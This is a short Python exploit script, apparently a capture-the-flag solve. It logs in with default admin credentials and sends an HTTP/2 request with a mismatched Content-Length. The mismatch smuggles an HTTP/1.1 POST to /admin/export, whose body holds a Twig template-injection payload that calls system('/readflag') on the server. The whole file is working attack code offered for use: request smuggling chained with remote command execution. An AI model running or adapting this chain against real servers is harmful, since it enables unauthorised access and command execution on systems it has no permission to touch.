import requests
from h2.connection import H2Connection
from h2.events import ResponseReceived, DataReceived
import os
import time
import httpx

host = "83.136.254.30"
port = 46826
# debug = True
debug = False

if debug:
    host = "localhost"
    port = 1337
s = requests.session()


def login():
    return s.post(f"https://{host}:{port}/login", data={"username":"admin","password":"admin"}, verify=False, allow_redirects=False)


def smuggle(cookie):
    # Target details
    url = f"https://{host}:{port}/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "1",
        "Host": "127.0.0.1"
    }

    # The body is a full HTTP/1.1 request to /admin/export
    body = (
        "aPOST /admin/export HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        f"Cookie: PHPSESSID={cookie}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "User-Agent: smuggl\r\n"
        "Content-length: 110\r\n"
        "\r\n"
        "log-title={{['/readflag','']|sort('system')|join}}&template-page=twitter&campaign=x&slack-url=x&redirect-url=x"
    )

    with httpx.Client(http2=True, verify=False) as client:
        response = client.post(url, headers=headers, content=body.encode("utf-8"))
        print("Status:", response.status_code)
        print("Headers:", response.headers)
        print("Body:", response.text)


r = login()
cookie = s.cookies["PHPSESSID"]
smuggle(cookie)
